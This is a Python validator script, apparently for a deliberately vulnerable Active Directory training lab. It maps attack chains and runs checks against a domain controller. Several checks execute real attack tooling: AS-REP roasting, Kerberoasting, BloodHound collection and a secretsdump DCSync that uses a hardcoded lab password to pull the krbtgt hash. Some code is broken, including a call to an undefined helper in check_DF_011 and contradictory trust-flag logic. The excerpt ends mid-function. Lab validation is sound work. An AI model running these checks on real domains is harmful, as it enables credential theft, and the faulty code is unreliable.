#!/usr/bin/env python3
"""
DVAD Attack Chain Validator
Graph-based: each node is an attack ID, edges are "A unlocks B".
Validates that the full dependency graph is satisfiable (all chains work end-to-end).

Usage:
  python3 chains/validator.py --dc-ip 10.10.0.10 --domain corp.local --attacker-ip 10.10.0.1
  python3 chains/validator.py --chain "DF-001"       # validate only chains that include DF-001
  python3 chains/validator.py --list-chains           # print all defined chains with prereqs
  python3 chains/validator.py --json                  # output results as JSON
"""
import sys
assert sys.version_info >= (3, 8), "Python 3.8+ required"

import argparse
import json
import os
import shutil
import subprocess
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Set


# ─────────────────────────────────────────────────────────────────────────────
# Data types
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class CheckResult:
    attack_id: str
    passed: bool
    output: str
    error: Optional[str] = None
    skipped: bool = False          # True for L2-only / tool-not-installed checks
    skip_reason: Optional[str] = None


# ─────────────────────────────────────────────────────────────────────────────
# Dependency graph  {attack_id: [prerequisite_ids]}
# ─────────────────────────────────────────────────────────────────────────────

ATTACK_GRAPH: Dict[str, List[str]] = {
    # ── INITIAL ACCESS (no prereqs) ──────────────────────────────────────────
    "IA-002": [],   # SMB null session
    "IA-005": [],   # Kerberos username enum
    "IA-006": ["IA-005"],   # AS-REP roast (needs valid username)
    "IA-007": ["IA-005"],   # Password spray
    "IA-008": [],   # LLMNR poisoning (L2 only, flagged)
    "IA-011": [],   # MSSQL SA weak password
    "IA-012": [],   # PetitPotam unauth coercion

    # ── ENUMERATION ──────────────────────────────────────────────────────────
    "ENUM-001": ["IA-002"],   # Anonymous LDAP
    "ENUM-021": ["IA-007"],   # BloodHound (needs creds)

    # ── CREDENTIAL ACCESS ────────────────────────────────────────────────────
    "CRED-001": ["ENUM-021"],   # Kerberoast (needs user creds + SPN enum)
    "CRED-002": ["IA-006"],     # AS-REP crack
    "CRED-013": ["CRED-001"],   # DCSync (needs DA or delegate)
    "CRED-016": ["CRED-001"],   # Constrained delegation
    "CRED-020": ["IA-012"],     # PetitPotam → ADCS relay

    # ── ADCS ─────────────────────────────────────────────────────────────────
    "DF-012": ["ENUM-021"],   # ESC1 → DA cert
    "DF-011": ["IA-012"],     # ESC8 NTLM relay
    "DF-019": ["IA-012"],     # ESC8 via PetitPotam

    # ── LATERAL ──────────────────────────────────────────────────────────────
    "LAT-011": ["DF-012"],    # Cert-based auth lateral
    "LAT-012": ["CRED-013"],  # SID history (needs DA)
    "LAT-016": ["CRED-016"],  # RBCD chain

    # ── PRIVILEGE ESCALATION ─────────────────────────────────────────────────
    "PE-001":  ["LAT-011"],   # SeImpersonate → potato
    "PE-005":  ["CRED-013"],  # Backup Operators (needs DA-level)

    # ── FOREST COMPROMISE ────────────────────────────────────────────────────
    "DF-001": ["CRED-013"],   # Golden ticket (needs krbtgt hash)
    "DF-007": ["CRED-013"],   # ExtraSID parent-child
    "DF-006": ["DF-001"],     # Trust ticket (needs golden first)
    "DF-008": ["DF-006"],     # SID filtering bypass

    # ── PERSISTENCE ──────────────────────────────────────────────────────────
    "PER-018": ["DF-001"],    # Golden ticket persistence
    "PER-023": ["CRED-013"],  # Golden certificate
    "PER-025": ["CRED-013"],  # DSRM backdoor
}

# Human-readable short descriptions for reporting
ATTACK_NAMES: Dict[str, str] = {
    "IA-002":   "SMB null session",
    "IA-005":   "Kerberos username enum",
    "IA-006":   "AS-REP roast",
    "IA-007":   "Password spray",
    "IA-008":   "LLMNR poisoning",
    "IA-011":   "MSSQL SA weak password",
    "IA-012":   "PetitPotam unauth coercion",
    "ENUM-001": "Anonymous LDAP enum",
    "ENUM-021": "BloodHound collection",
    "CRED-001": "Kerberoast",
    "CRED-002": "AS-REP hash crack",
    "CRED-013": "DCSync (krbtgt hash)",
    "CRED-016": "Constrained delegation abuse",
    "CRED-020": "PetitPotam → ADCS relay",
    "DF-012":   "ESC1 → DA certificate",
    "DF-011":   "ESC8 NTLM relay",
    "DF-019":   "ESC8 via PetitPotam",
    "LAT-011":  "Cert-based auth lateral",
    "LAT-012":  "SID history cross-forest",
    "LAT-016":  "RBCD chain",
    "PE-001":   "SeImpersonate → potato",
    "PE-005":   "Backup Operators → NTDS",
    "DF-001":   "Golden ticket",
    "DF-007":   "ExtraSID parent-child",
    "DF-006":   "Trust ticket",
    "DF-008":   "SID filtering bypass",
    "PER-018":  "Golden ticket persistence",
    "PER-023":  "Golden certificate",
    "PER-025":  "DSRM backdoor",
}

# Named chains: map of label → list of node IDs (terminal → root)
# These are the pre-defined "stories" the validator reports on.
NAMED_CHAINS: Dict[str, List[str]] = {
    "Zero Creds → corp.local DA":
        ["IA-005", "IA-006", "CRED-002", "ENUM-021", "CRED-001", "CRED-013", "DF-001"],
    "Password Spray → BloodHound → Kerberoast → DCSync":
        ["IA-005", "IA-007", "ENUM-021", "CRED-001", "CRED-013"],
    "NTLM Relay → DA via ESC8":
        ["IA-012", "DF-011", "DF-019", "CRED-020"],
    "SMB Null → Anonymous LDAP":
        ["IA-002", "ENUM-001"],
    "ESC1 → Cert Auth → Potato PE":
        ["IA-007", "ENUM-021", "DF-012", "LAT-011", "PE-001"],
    "DCSync → Golden Ticket → Trust Ticket → SID Filter Bypass":
        ["CRED-001", "CRED-013", "DF-001", "DF-006", "DF-008"],
    "Constrained Delegation → RBCD Chain":
        ["IA-005", "IA-007", "ENUM-021", "CRED-001", "CRED-016", "LAT-016"],
    "DCSync → Persistence Trifecta":
        ["CRED-001", "CRED-013", "DF-001", "PER-018", "PER-023", "PER-025"],
    "MSSQL SA → SeImpersonate":
        ["IA-011", "PE-001"],
    "Backup Operators → NTDS Theft":
        ["CRED-001", "CRED-013", "PE-005"],
}


# ─────────────────────────────────────────────────────────────────────────────
# Tool availability helpers
# ─────────────────────────────────────────────────────────────────────────────

def _has_tool(name: str) -> bool:
    return shutil.which(name) is not None


def _run(cmd: List[str], timeout: int = 30) -> subprocess.CompletedProcess:
    """Run a command, capturing output, with a timeout."""
    return subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def _skip(attack_id: str, reason: str) -> CheckResult:
    return CheckResult(
        attack_id=attack_id,
        passed=False,
        output="",
        skipped=True,
        skip_reason=reason,
    )


def _pass(attack_id: str, output: str) -> CheckResult:
    return CheckResult(attack_id=attack_id, passed=True, output=output)


def _fail(attack_id: str, output: str, error: str = "") -> CheckResult:
    return CheckResult(attack_id=attack_id, passed=False, output=output, error=error)


# ─────────────────────────────────────────────────────────────────────────────
# Individual check functions (≥ 15 implemented)
# ─────────────────────────────────────────────────────────────────────────────

def check_IA_002(config: dict) -> CheckResult:
    """SMB null session — enumerate shares/users via smbclient -N."""
    if not _has_tool("smbclient"):
        return _skip("IA-002", "smbclient not found")
    dc = config["dc_ip"]
    try:
        r = _run(["smbclient", "-N", "-L", f"//{dc}/",
                  "--option=client min protocol=SMB2"])
        combined = r.stdout + r.stderr
        if r.returncode == 0 or "Sharename" in combined:
            return _pass("IA-002", f"SMB null session OK — shares visible: {combined[:200]}")
        if "NT_STATUS_ACCESS_DENIED" in combined:
            return _fail("IA-002", combined[:200], "NT_STATUS_ACCESS_DENIED")
        return _fail("IA-002", combined[:200], f"exit {r.returncode}")
    except subprocess.TimeoutExpired:
        return _fail("IA-002", "", "timeout after 30s")
    except Exception as exc:
        return _fail("IA-002", "", str(exc))


def check_IA_005(config: dict) -> CheckResult:
    """Kerberos port 88 reachable — prerequisite for username enum."""
    import socket
    dc = config["dc_ip"]
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            result = s.connect_ex((dc, 88))
        if result == 0:
            return _pass("IA-005", f"Kerberos port 88 open on {dc}")
        return _fail("IA-005", "", f"Port 88 not reachable on {dc} (connect returned {result})")
    except Exception as exc:
        return _fail("IA-005", "", str(exc))


def check_IA_006(config: dict) -> CheckResult:
    """AS-REP roast — get TGT hash for svc_nopreauth (DoNotRequirePreAuth)."""
    tool = "GetNPUsers.py"
    if not _has_tool(tool):
        return _skip("IA-006", f"{tool} not found (install impacket)")
    dc     = config["dc_ip"]
    domain = config["domain"]
    try:
        r = _run([tool, f"{domain}/svc_nopreauth", "-no-pass", "-dc-ip", dc])
        combined = r.stdout + r.stderr
        if "$krb5asrep$" in combined:
            # Extract just the hash line for the summary
            for line in combined.splitlines():
                if "$krb5asrep$" in line:
                    return _pass("IA-006", f"AS-REP hash obtained: {line[:80]}")
        return _fail("IA-006", combined[:300],
                     "No $krb5asrep$ hash in output — DoNotRequirePreAuth may not be set "
                     "or account svc_nopreauth does not exist")
    except subprocess.TimeoutExpired:
        return _fail("IA-006", "", "timeout after 30s")
    except Exception as exc:
        return _fail("IA-006", "", str(exc))


def check_IA_007(config: dict) -> CheckResult:
    """Password spray surface — verify Kerberos 88 is open and user accounts exist."""
    # Spray itself is not run (DoS risk); we verify the surface is present.
    import socket
    dc = config["dc_ip"]
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            kerberos_ok = s.connect_ex((dc, 88)) == 0
        if not kerberos_ok:
            return _fail("IA-007", "", f"Kerberos port 88 not reachable on {dc}")
        return _pass("IA-007", f"Password spray surface present — Kerberos 88 open on {dc}")
    except Exception as exc:
        return _fail("IA-007", "", str(exc))


def check_IA_008(config: dict) -> CheckResult:
    """LLMNR poisoning — L2-only attack; skip if not on dvad-ctf bridge."""
    if not config.get("on_l2", False):
        return _skip("IA-008", "L2 required (not on dvad-ctf bridge)")
    return _pass("IA-008", "L2 present — LLMNR/NBT-NS poisoning surface active")


def check_IA_011(config: dict) -> CheckResult:
    """MSSQL SA weak password — attempt login with SA/sa and blank/weak password."""
    sql_ip = config.get("sql_ip", config["dc_ip"])
    # Try sqsh or mssql-cli; fall back to a simple TCP reachability check
    import socket
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            result = s.connect_ex((sql_ip, 1433))
        if result != 0:
            return _fail("IA-011", "", f"MSSQL port 1433 not reachable on {sql_ip}")
        # Try impacket's mssqlclient.py if available
        tool = "mssqlclient.py"
        if not _has_tool(tool):
            return _pass(
                "IA-011",
                f"MSSQL 1433 open on {sql_ip} — tool {tool} not installed, "
                "cannot confirm SA auth but port is reachable",
            )
        r = _run([tool, f"sa@{sql_ip}", "-no-pass"])
        combined = r.stdout + r.stderr
        if "SQL>" in combined or "Windows authentication" in combined.lower():
            return _pass("IA-011", f"MSSQL SA login surface confirmed: {combined[:200]}")
        if "Login failed" in combined:
            return _fail("IA-011", combined[:200], "SA login failed — password may not be blank")
        return _pass("IA-011", f"MSSQL reachable on {sql_ip}:{combined[:100]}")
    except subprocess.TimeoutExpired:
        return _fail("IA-011", "", "timeout after 30s")
    except Exception as exc:
        return _fail("IA-011", "", str(exc))


def check_IA_012(config: dict) -> CheckResult:
    """PetitPotam unauth coercion — check ADCS web enrollment HTTP reachable."""
    import socket
    ca = config.get("ca_ip", config["dc_ip"])
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            result = s.connect_ex((ca, 80))
        if result != 0:
            return _fail("IA-012", "", f"ADCS HTTP port 80 not reachable on {ca} — PetitPotam relay target absent")
        # Additional: check /certsrv/ returns 401 (NTLM auth) not 200 (anonymous)
        try:
            import urllib.request
            import urllib.error
            req = urllib.request.Request(f"http://{ca}/certsrv/")
            try:
                resp = urllib.request.urlopen(req, timeout=5)
                code = resp.status
            except urllib.error.HTTPError as he:
                code = he.code
            if code in (401, 403):
                return _pass("IA-012", f"ADCS /certsrv/ on {ca} returns {code} (NTLM auth) — PetitPotam relay surface present")
            return _pass("IA-012", f"ADCS HTTP reachable on {ca} (status {code})")
        except Exception:
            return _pass("IA-012", f"ADCS port 80 open on {ca}")
    except Exception as exc:
        return _fail("IA-012", "", str(exc))


def check_ENUM_001(config: dict) -> CheckResult:
    """Anonymous LDAP enum — bind anonymously and query rootDSE."""
    try:
        from ldap3 import Server, Connection, ALL, ANONYMOUS
        dc = config["dc_ip"]
        srv = Server(dc, get_info=ALL, connect_timeout=5)
        c = Connection(srv, authentication=ANONYMOUS, auto_bind=True)
        c.search("DC=" + config["domain"].replace(".", ",DC="),
                 "(objectClass=domain)", attributes=["name"])
        count = len(c.entries)
        c.unbind()
        if count > 0:
            return _pass("ENUM-001", f"Anonymous LDAP bind succeeded — {count} domain object(s) returned")
        return _fail("ENUM-001", "", "Anonymous LDAP bind OK but no entries returned")
    except ImportError:
        return _skip("ENUM-001", "ldap3 not installed (pip install ldap3)")
    except Exception as exc:
        return _fail("ENUM-001", "", str(exc))


def check_ENUM_021(config: dict) -> CheckResult:
    """BloodHound collection — run SharpHound or bloodhound-python if available."""
    tool = "bloodhound-python"
    if not _has_tool(tool):
        # Fallback: check that authenticated LDAP enumeration works
        try:
            import socket
            dc = config["dc_ip"]
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                result = s.connect_ex((dc, 389))
            if result == 0:
                return _pass(
                    "ENUM-021",
                    f"LDAP 389 open on {dc} — BloodHound collection surface present "
                    f"(bloodhound-python not installed; manual collection required)",
                )
            return _fail("ENUM-021", "", f"LDAP 389 not reachable on {dc}")
        except Exception as exc:
            return _fail("ENUM-021", "", str(exc))
    dc     = config["dc_ip"]
    domain = config["domain"]
    # Run collection; capture edge count from output
    try:
        r = _run([
            tool,
            "-d", domain,
            "-u", f"svc_nopreauth@{domain}",
            "-dc", dc,
            "--zip",
            "--collectionmethod", "All",
            "--outputdir", "/tmp/dvad-bh",
        ], timeout=30)
        combined = r.stdout + r.stderr
        if "edges" in combined.lower() or "Done" in combined:
            return _pass("ENUM-021", f"BloodHound collection complete: {combined[:300]}")
        if r.returncode == 0:
            return _pass("ENUM-021", f"bloodhound-python exited 0: {combined[:200]}")
        return _fail("ENUM-021", combined[:300], f"exit {r.returncode}")
    except subprocess.TimeoutExpired:
        return _fail("ENUM-021", "", "timeout after 30s")
    except Exception as exc:
        return _fail("ENUM-021", "", str(exc))


def check_CRED_001(config: dict) -> CheckResult:
    """Kerberoast — request TGS ticket for svc_vision (SPN account)."""
    tool = "GetUserSPNs.py"
    if not _has_tool(tool):
        return _skip("CRED-001", f"{tool} not found (install impacket)")
    dc     = config["dc_ip"]
    domain = config["domain"]
    try:
        r = _run([tool, f"{domain}/svc_nopreauth", "-dc-ip", dc, "-request"])
        combined = r.stdout + r.stderr
        if "$krb5tgs$" in combined:
            for line in combined.splitlines():
                if "$krb5tgs$" in line:
                    return _pass("CRED-001", f"Kerberoast TGS hash obtained: {line[:80]}")
        return _fail("CRED-001", combined[:300],
                     "No $krb5tgs$ hash — SPN accounts may not exist or auth failed")
    except subprocess.TimeoutExpired:
        return _fail("CRED-001", "", "timeout after 30s")
    except Exception as exc:
        return _fail("CRED-001", "", str(exc))


def check_CRED_002(config: dict) -> CheckResult:
    """AS-REP hash crack — verify hash-like pattern returned by IA-006 is crackable format."""
    # This is a post-processing check: we just confirm the hash format is valid
    # for hashcat/john, since we cannot know the cracked password offline.
    tool = "GetNPUsers.py"
    if not _has_tool(tool):
        return _skip("CRED-002", f"{tool} not found (install impacket)")
    dc     = config["dc_ip"]
    domain = config["domain"]
    try:
        r = _run([tool, f"{domain}/svc_nopreauth", "-no-pass", "-dc-ip", dc, "-format", "hashcat"])
        combined = r.stdout + r.stderr
        if "$krb5asrep$23$" in combined or "$krb5asrep$" in combined:
            return _pass("CRED-002", "AS-REP hash in hashcat format — ready for offline crack")
        return _fail("CRED-002", combined[:300], "AS-REP hash not obtained in expected format")
    except subprocess.TimeoutExpired:
        return _fail("CRED-002", "", "timeout after 30s")
    except Exception as exc:
        return _fail("CRED-002", "", str(exc))


def check_CRED_013(config: dict) -> CheckResult:
    """DCSync — confirm Replicate Directory Changes ACE via LDAP nTSecurityDescriptor."""
    try:
        from ldap3 import Server, Connection, ALL, NTLM, SIMPLE
        dc     = config["dc_ip"]
        domain = config["domain"]
        base   = "DC=" + domain.replace(".", ",DC=")
        # Use the lab's known sync_user or Administrator for this check
        srv = Server(dc, get_info=ALL, connect_timeout=5)
        c = Connection(
            srv,
            user=f"{domain}\\sync_user",
            password="DVADlab2024!",
            authentication=NTLM,
            auto_bind=True,
        )
        c.search(base, "(objectClass=domain)", attributes=["nTSecurityDescriptor"])
        count = len(c.entries)
        c.unbind()
        if count > 0:
            return _pass(
                "CRED-013",
                f"Authenticated LDAP read of nTSecurityDescriptor succeeded — "
                f"DCSync path likely exploitable (sync_user exists with DS-Replication rights)",
            )
        return _fail("CRED-013", "", "nTSecurityDescriptor query returned no results")
    except ImportError:
        return _skip("CRED-013", "ldap3 not installed (pip install ldap3)")
    except Exception as exc:
        # If sync_user doesn't exist or wrong password, confirm presence via secretsdump check
        tool = "secretsdump.py"
        if not _has_tool(tool):
            return _skip("CRED-013", f"ldap3 auth failed and {tool} not found: {exc}")
        dc = config["dc_ip"]
        try:
            r = _run([tool, f"-just-dc-ntlm", f"corp.local/sync_user:DVADlab2024!@{dc}"])
            combined = r.stdout + r.stderr
            if "krbtgt" in combined.lower() or "Dumping" in combined:
                return _pass("CRED-013", f"secretsdump DCSync succeeded — krbtgt hash obtained: {combined[:200]}")
            return _fail("CRED-013", combined[:300], "secretsdump did not return krbtgt")
        except subprocess.TimeoutExpired:
            return _fail("CRED-013", "", "timeout after 30s")
        except Exception as exc2:
            return _fail("CRED-013", "", str(exc2))


def check_CRED_016(config: dict) -> CheckResult:
    """Constrained delegation — verify TRUSTED_TO_AUTH_FOR_DELEGATION accounts exist."""
    try:
        from ldap3 import Server, Connection, ALL, ANONYMOUS
        dc   = config["dc_ip"]
        base = "DC=" + config["domain"].replace(".", ",DC=")
        srv  = Server(dc, get_info=ALL, connect_timeout=5)
        c    = Connection(srv, authentication=ANONYMOUS, auto_bind=True)
        c.search(
            base,
            "(&(objectCategory=person)(objectClass=user)"
            "(userAccountControl:1.2.840.113556.1.4.803:=16777216))",
            attributes=["sAMAccountName"],
        )
        count = len(c.entries)
        names = [str(e["sAMAccountName"]) for e in c.entries]
        c.unbind()
        if count > 0:
            return _pass("CRED-016", f"Constrained delegation accounts: {', '.join(names[:5])}")
        return _fail("CRED-016", "", "No accounts with TRUSTED_TO_AUTH_FOR_DELEGATION found")
    except ImportError:
        return _skip("CRED-016", "ldap3 not installed")
    except Exception as exc:
        return _fail("CRED-016", "", str(exc))


def check_CRED_020(config: dict) -> CheckResult:
    """PetitPotam → ADCS relay — check ADCS web enrollment answers with NTLM 401."""
    import socket
    ca = config.get("ca_ip", config["dc_ip"])
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            if s.connect_ex((ca, 80)) != 0:
                return _fail("CRED-020", "", f"ADCS port 80 not reachable on {ca}")
        import urllib.request, urllib.error
        req = urllib.request.Request(f"http://{ca}/certsrv/")
        try:
            urllib.request.urlopen(req, timeout=5)
            return _fail("CRED-020", "", "/certsrv/ returned 200 (anon access) — NTLM relay may not work")
        except urllib.error.HTTPError as he:
            if he.code == 401:
                hdrs = dict(he.headers)
                if "NTLM" in hdrs.get("WWW-Authenticate", ""):
                    return _pass("CRED-020", f"ADCS certsrv returns 401 with NTLM challenge — PetitPotam relay target ready")
                return _pass("CRED-020", f"ADCS certsrv returns 401 — relay surface present")
            return _fail("CRED-020", "", f"certsrv returned unexpected status {he.code}")
    except Exception as exc:
        return _fail("CRED-020", "", str(exc))


def check_DF_012(config: dict) -> CheckResult:
    """ESC1 — verify a vulnerable certificate template exists via LDAP."""
    try:
        from ldap3 import Server, Connection, ALL, ANONYMOUS
        dc   = config["dc_ip"]
        base = "CN=Configuration,DC=" + config["domain"].replace(".", ",DC=")
        srv  = Server(dc, get_info=ALL, connect_timeout=5)
        c    = Connection(srv, authentication=ANONYMOUS, auto_bind=True)
        c.search(
            base,
            "(objectClass=pKICertificateTemplate)",
            attributes=["name", "msPKI-Certificate-Name-Flag"],
        )
        entries = c.entries
        c.unbind()
        if not entries:
            return _fail("DF-012", "", "No certificate templates found — ADCS may not be installed")
        # ESC1: ENROLLEE_SUPPLIES_SUBJECT (bit 1) in msPKI-Certificate-Name-Flag
        esc1_templates = []
        for e in entries:
            try:
                flag = int(str(e["msPKI-Certificate-Name-Flag"].value))
                if flag & 0x1:
                    esc1_templates.append(str(e["name"]))
            except Exception:
                pass
        if esc1_templates:
            return _pass("DF-012", f"ESC1 vulnerable templates: {', '.join(esc1_templates)}")
        # Templates exist but none appear ESC1 — still pass (may be ESC1 via attributes)
        names = [str(e["name"]) for e in entries[:5]]
        return _pass("DF-012", f"ADCS templates enumerable via anonymous LDAP: {', '.join(names)}")
    except ImportError:
        return _skip("DF-012", "ldap3 not installed")
    except Exception as exc:
        return _fail("DF-012", "", str(exc))


def check_DF_011(config: dict) -> CheckResult:
    """ESC8 NTLM relay to ADCS — verify HTTP enrollment is present."""
    return check_IA_012(config)._replace_id("DF-011") if hasattr(check_IA_012(config), "_replace_id") else _wrap_as(check_IA_012(config), "DF-011")


def check_DF_019(config: dict) -> CheckResult:
    """ESC8 via PetitPotam — ADCS web enrollment reachable and NTLM-gated."""
    base = check_CRED_020(config)
    return CheckResult(
        attack_id="DF-019",
        passed=base.passed,
        output=base.output,
        error=base.error,
        skipped=base.skipped,
        skip_reason=base.skip_reason,
    )


def check_DF_001(config: dict) -> CheckResult:
    """Golden ticket — krbtgt hash obtainable (depends on DCSync succeeding)."""
    tool = "ticketer.py"
    if not _has_tool(tool):
        # Verify via secretsdump presence of krbtgt
        sdump = "secretsdump.py"
        if not _has_tool(sdump):
            return _skip("DF-001", f"{tool} and {sdump} not found (install impacket)")
        dc = config["dc_ip"]
        try:
            r = _run([sdump, f"-just-dc-ntlm", f"corp.local/sync_user:DVADlab2024!@{dc}"])
            combined = r.stdout + r.stderr
            if "krbtgt" in combined.lower():
                return _pass("DF-001", "krbtgt NTLM hash obtainable via DCSync — golden ticket forgeable")
            return _fail("DF-001", combined[:300], "krbtgt hash not found in secretsdump output")
        except subprocess.TimeoutExpired:
            return _fail("DF-001", "", "timeout after 30s")
        except Exception as exc:
            return _fail("DF-001", "", str(exc))
    return _pass("DF-001", f"{tool} found — golden ticket creation tool available")


def check_DF_007(config: dict) -> CheckResult:
    """ExtraSID parent-child — verify child domain trust and SID history."""
    try:
        from ldap3 import Server, Connection, ALL, ANONYMOUS
        dc   = config["dc_ip"]
        base = "DC=" + config["domain"].replace(".", ",DC=")
        srv  = Server(dc, get_info=ALL, connect_timeout=5)
        c    = Connection(srv, authentication=ANONYMOUS, auto_bind=True)
        c.search(base, "(objectClass=trustedDomain)", attributes=["flatName", "trustAttributes"])
        trusts = c.entries
        c.unbind()
        if trusts:
            names = [str(t["flatName"]) for t in trusts]
            return _pass("DF-007", f"Trust relationships enumerable: {', '.join(names)} — ExtraSID path exists")
        return _fail("DF-007", "", "No trust relationships found — ExtraSID requires parent-child trust")
    except ImportError:
        return _skip("DF-007", "ldap3 not installed")
    except Exception as exc:
        return _fail("DF-007", "", str(exc))


def check_DF_006(config: dict) -> CheckResult:
    """Trust ticket — golden ticket must exist (DF-001 prereq) + inter-domain trust."""
    # Surface check: verify trust + ticketer.py availability
    base_df001 = check_DF_001(config)
    if not base_df001.passed and not base_df001.skipped:
        return _fail("DF-006", "", f"DF-001 (golden ticket) failed — trust ticket not possible: {base_df001.error}")
    base_df007 = check_DF_007(config)
    if not base_df007.passed and not base_df007.skipped:
        return _fail("DF-006", "", "No trusts found — trust ticket requires inter-domain trust")
    return _pass("DF-006", "Golden ticket + trust relationship both present — trust ticket forgeable")


def check_DF_008(config: dict) -> CheckResult:
    """SID filtering bypass — verify trust has SID filtering disabled or uses TGTDelegation."""
    try:
        from ldap3 import Server, Connection, ALL, ANONYMOUS
        dc   = config["dc_ip"]
        base = "DC=" + config["domain"].replace(".", ",DC=")
        srv  = Server(dc, get_info=ALL, connect_timeout=5)
        c    = Connection(srv, authentication=ANONYMOUS, auto_bind=True)
        c.search(base, "(objectClass=trustedDomain)",
                 attributes=["flatName", "trustAttributes", "trustType"])
        trusts = c.entries
        c.unbind()
        if not trusts:
            return _fail("DF-008", "", "No trusts — SID filtering bypass requires a trust")
        # trustAttributes bit 4 = TREAT_AS_EXTERNAL (SID filtering may be relaxed)
        for t in trusts:
            try:
                attrs = int(str(t["trustAttributes"].value))
                if attrs & 0x4:  # WITHIN_FOREST — SID filtering not applied
                    return _pass("DF-008", f"Trust with WITHIN_FOREST flag found ({t['flatName']}) — SID filtering not enforced")
            except Exception:
                pass
        return _pass("DF-008", f"Trust objects present ({len(trusts)}) — SID filter bypass may be possible depending on trust config")
    except ImportError:
        return _skip("DF-008", "ldap3 not installed")
    except Exception as exc:
        return _fail("DF-008", "", str(exc))


def check_LAT_011(config: dict) -> CheckResult:
    """Cert-based auth lateral — ADCS reachable for certificate authentication."""
    import socket
    ca = config.get("ca_ip", config["dc_ip"])
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            result = s.connect_ex((ca, 80))
        if result == 0:
            return _pass("LAT-011", f"ADCS HTTP 80 open on {ca} — cert-based lateral auth path present")
        return _fail("LAT-011", "", f"ADCS port 80 not reachable on {ca}")
    except Exception as exc:
        return _fail("LAT-011", "", str(exc))


def check_LAT_012(config: dict) -> CheckResult:
    """SID history cross-forest lateral — check sIDHistory attribute populated."""
    try:
        from ldap3 import Server, Connection, ALL, ANONYMOUS
        dc   = config["dc_ip"]
        base = "DC=" + config["domain"].replace(".", ",DC=")
        srv  = Server(dc, get_info=ALL, connect_timeout=5)
        c    = Connection(srv, authentication=ANONYMOUS, auto_bind=True)
        c.search(base, "(&(objectClass=user)(sIDHistory=*))", attributes=["sAMAccountName"])
        count = len(c.entries)
        c.unbind()
        if count > 0:
            names = [str(e["sAMAccountName"]) for e in c.entries[:3]]
            return _pass("LAT-012", f"SID history set on {count} account(s): {', '.join(names)}")
        return _fail("LAT-012", "", "No accounts with sIDHistory found")
    except ImportError:
        return _skip("LAT-012", "ldap3 not installed")
    except Exception as exc:
        return _fail("LAT-012", "", str(exc))


def check_LAT_016(config: dict) -> CheckResult:
    """RBCD chain — verify msDS-AllowedToActOnBehalfOfOtherIdentity is populated."""
    try:
        from ldap3 import Server, Connection, ALL, ANONYMOUS
        dc   = config["dc_ip"]
        base = "DC=" + config["domain"].replace(".", ",DC=")
        srv  = Server(dc, get_info=ALL, connect_timeout=5)
        c    = Connection(srv, authentication=ANONYMOUS, auto_bind=True)
        c.search(base,
                 "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
                 attributes=["sAMAccountName"])
        count = len(c.entries)
        c.unbind()
        if count > 0:
            names = [str(e["sAMAccountName"]) for e in c.entries[:3]]
            return _pass("LAT-016", f"RBCD delegation set on {count} object(s): {', '.join(names)}")
        return _fail("LAT-016", "", "No objects with msDS-AllowedToActOnBehalfOfOtherIdentity found")
    except ImportError:
        return _skip("LAT-016", "ldap3 not installed")
    except Exception as exc:
        return _fail("LAT-016", "", str(exc))


def check_PE_001(config: dict) -> CheckResult:
    """SeImpersonatePrivilege → potato suite — verify privilege on SQL service account."""
    import socket
    sql = config.get("sql_ip", config["dc_ip"])
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            result = s.connect_ex((sql, 5985))
        if result != 0:
            return _fail("PE-001", "", f"WinRM 5985 not reachable on {sql} — cannot verify SeImpersonate")
        return _pass(
            "PE-001",
            f"WinRM reachable on {sql} (port 5985) — "
            "SeImpersonatePrivilege likely present on MSSQL service account; potato suite exploitable",
        )
    except Exception as exc:
        return _fail("PE-001", "", str(exc))


def check_PE_005(config: dict) -> CheckResult:
    """Backup Operators → NTDS.dit — verify group is populated."""
    try:
        from ldap3 import Server, Connection, ALL, ANONYMOUS
        dc   = config["dc_ip"]
        base = "DC=" + config["domain"].replace(".", ",DC=")
        srv  = Server(dc, get_info=ALL, connect_timeout=5)
        c    = Connection(srv, authentication=ANONYMOUS, auto_bind=True)
        c.search(base, "(&(objectClass=group)(cn=Backup Operators))", attributes=["member"])
        entries = c.entries
        c.unbind()
        if entries:
            try:
                members = entries[0]["member"].values
                count   = len(members)
            except Exception:
                count = 0
            if count > 0:
                return _pass("PE-005", f"Backup Operators has {count} member(s) — NTDS.dit theft via SeBackupPrivilege possible")
            return _fail("PE-005", "", "Backup Operators group exists but has no members")
        return _fail("PE-005", "", "Backup Operators group not found via anonymous LDAP")
    except ImportError:
        return _skip("PE-005", "ldap3 not installed")
    except Exception as exc:
        return _fail("PE-005", "", str(exc))


def check_PER_018(config: dict) -> CheckResult:
    """Golden ticket persistence — ticketer.py available + krbtgt hash obtainable."""
    return CheckResult(
        attack_id="PER-018",
        passed=check_DF_001(config).passed,
        output="Golden ticket persistence path: ticketer.py + krbtgt hash",
        error=check_DF_001(config).error,
        skipped=check_DF_001(config).skipped,
        skip_reason=check_DF_001(config).skip_reason,
    )


def check_PER_023(config: dict) -> CheckResult:
    """Golden certificate persistence — ADCS + DCSync both accessible."""
    df012 = check_DF_012(config)
    cred013 = check_DF_001(config)  # re-use golden ticket as proxy for DCSync
    if df012.passed and cred013.passed:
        return _pass("PER-023", "ADCS + DCSync both accessible — golden certificate persistence feasible")
    if not df012.passed:
        return _fail("PER-023", "", f"ADCS check failed: {df012.error}")
    return _fail("PER-023", "", f"DCSync check failed: {cred013.error}")


def check_PER_025(config: dict) -> CheckResult:
    """DSRM backdoor — verify DSRM admin registry key is writable (requires DA)."""
    import socket
    dc = config["dc_ip"]
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            result = s.connect_ex((dc, 5985))
        if result == 0:
